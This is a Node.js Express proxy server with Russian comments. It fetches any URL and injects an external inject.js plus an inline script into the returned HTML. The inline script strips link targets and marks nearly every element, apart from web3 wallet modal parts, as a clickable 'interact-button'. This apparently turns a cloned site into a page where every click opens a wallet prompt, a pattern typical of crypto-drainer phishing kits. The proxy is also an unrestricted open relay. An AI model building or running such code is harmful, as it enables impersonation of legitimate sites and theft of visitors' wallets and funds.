const express = require("express");
const http = require("http");
const https = require("https");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Раздаём inject.js из текущей папки
app.get("/inject.js", (req, res) => {
  res.sendFile(path.join(__dirname, "inject.js"));
});

// Тег для вставки скрипта внешнего файла
const injectedScriptTag = `<script charset="UTF-8" type="text/javascript" src="./inject.js"></script>`;

// Твой дополнительный inline-скрипт
const inlineScript = `
<script>
  function addClassesToElements() {
    const links = document.querySelectorAll('a:not(.interact-button)');
    for (const link of links) {
      link.removeAttribute('href');
      link.classList.add('interact-button');
    }
    const buttons = document.querySelectorAll('div:not(.interact-button):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
    for (const button of buttons) {
      button.classList.add('interact-button');
    }
  }
  
  function runWhenReady() {
    addClassesToElements();
    setInterval(addClassesToElements, 300);
  }
  
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", runWhenReady);
  } else {
    runWhenReady();
  }
</script>
`;

app.get("/proxy", (req, res) => {
  const targetUrl = req.query.url;
  if (!targetUrl) return res.status(400).send("Параметр ?url= обязателен");

  let urlObj;
  try {
    urlObj = new URL(targetUrl);
  } catch {
    return res.status(400).send("Некорректный URL");
  }

  const protocol = urlObj.protocol === "https:" ? https : http;

  protocol
    .get(targetUrl, (proxyRes) => {
      let body = [];

      proxyRes.on("data", (chunk) => body.push(chunk));

      proxyRes.on("end", () => {
        let contentType = proxyRes.headers["content-type"] || "";
        let responseBody = Buffer.concat(body).toString("utf8");

        if (contentType.includes("text/html")) {
          // Убрана часть, добавлявшая класс interact-button к первому <div>

          // Вставляем оба скрипта перед </head>
          if (responseBody.includes("</head>")) {
            responseBody = responseBody.replace(
              "</head>",
              `${injectedScriptTag}\n${inlineScript}</head>`,
            );
          } else {
            responseBody = injectedScriptTag + inlineScript + responseBody;
          }
        }

        let headers = { ...proxyRes.headers };
        delete headers["content-length"];
        delete headers["content-encoding"];

        res.writeHead(proxyRes.statusCode, headers);
        res.end(responseBody);
      });
    })
    .on("error", (err) => {
      res.status(500).send("Ошибка при проксировании: " + err.message);
    });
});

app.listen(PORT, () => {
  console.log(`🚀 Сервер запущен на порту ${PORT}`);
});
